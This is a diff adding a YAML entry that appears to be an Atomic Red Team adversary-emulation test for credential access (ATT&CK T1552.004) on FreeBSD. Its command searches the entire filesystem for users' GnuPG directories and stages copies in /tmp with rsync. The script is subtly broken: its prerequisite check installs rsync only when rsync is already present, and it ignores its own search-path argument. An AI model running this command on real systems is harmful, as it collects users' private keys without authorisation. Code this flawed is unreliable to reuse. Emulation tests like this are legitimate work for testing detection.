@@ -1,0 +1,49 @@
+- id: b05ac39b-515f-48e9-88e9-2f141b5bcad0
+  name: Copy the users GnuPG directory with rsync (freebsd)
+  description: Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging
+    folder using the `rsync` command.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ ! -x "$(command -v rsync)" ]; then : ; else (which pkg && pkg
+          install -y rsync); fi; mkdir /tmp/GnuPG; find / -type d -name ''.gnupg''
+          2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;'
+        cleanup: 'rm -rf #{output_folder}'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1552.004
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      search_path:
+        description: Path where to start searching from
+        type: path
+        default: /
+      output_folder:
+        description: Output folder containing a copy of the .gnupg directory
+        type: path
+        default: /tmp/GnuPG
+    dependencies:
+    - description: 'Check if rsync is installed.
+
+        '
+      prereq_command: 'if [ ! -x "$(command -v rsync)" ]; then exit 1; else exit 0;
+        fi;
+
+        '
+      get_prereq_command: '(which pkg && pkg install -y rsync)
+
+        '
+    technique_created: '2020-02-04T13:06:49.258Z'
+    atomic_guid: b05ac39b-515f-48e9-88e9-2f141b5bcad0
+    import_timestamp: '2025-06-24T11:15:56.491727Z'
